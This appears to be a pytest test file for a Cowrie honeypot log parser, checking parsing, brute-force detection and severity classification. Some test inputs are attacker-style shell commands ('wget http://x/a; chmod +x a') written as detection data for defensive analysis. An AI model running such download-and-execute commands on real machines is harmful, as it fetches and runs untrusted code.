import json
import os
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import honeypot_parser as h

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SAMPLE = os.path.join(HERE, "samples", "cowrie.json")


def ev(eid, sess="s1", ip="1.1.1.1", **k):
    return json.dumps(dict(eventid=eid, session=sess, src_ip=ip, **k))


def test_parse_skips_bad_lines():
    assert len(h.parse_log(["", "nope", "[1]", ev("cowrie.session.connect")])) == 1


def test_classify_command():
    labels = [l for l, _ in h.classify_command("cd /tmp; wget http://x/a; chmod +x a")]
    assert "Downloads a file" in labels and "Makes a file executable" in labels
    assert h.classify_command("ls") == []


def test_brute_force_detected():
    lines = [ev("cowrie.login.failed", sess="s%d" % i, username="root", password="x") for i in range(10)]
    r = h.analyze(h.parse_log(lines))
    assert r["findings"][0]["type"] == "brute_force"


def test_below_threshold_not_flagged():
    lines = [ev("cowrie.login.failed") for _ in range(3)]
    assert h.analyze(h.parse_log(lines))["findings"] == []


def test_compromised_session_is_high():
    lines = [ev("cowrie.login.success", username="root", password="root"),
             ev("cowrie.command.input", input="wget http://a/b")]
    f = h.analyze(h.parse_log(lines))["findings"][0]
    assert f["severity"] == "HIGH" and f["type"] == "compromised_session"


def test_harmless_login_is_low():
    lines = [ev("cowrie.login.success", username="pi", password="x"),
             ev("cowrie.command.input", input="ls")]
    assert h.analyze(h.parse_log(lines))["findings"][0]["severity"] == "LOW"


def test_sample_file():
    with open(SAMPLE) as f:
        r = h.analyze(h.parse_log(f))
    types = [x["type"] for x in r["findings"]]
    assert types.count("compromised_session") == 2
    assert "brute_force" in types and "scanner" in types and "login_only" in types


def test_cli_json_exit_code():
    p = subprocess.run([sys.executable, os.path.join(HERE, "honeypot_parser.py"), SAMPLE, "--json"],
                       capture_output=True, text=True)
    assert p.returncode == 1
    assert json.loads(p.stdout)["sessions"] > 0
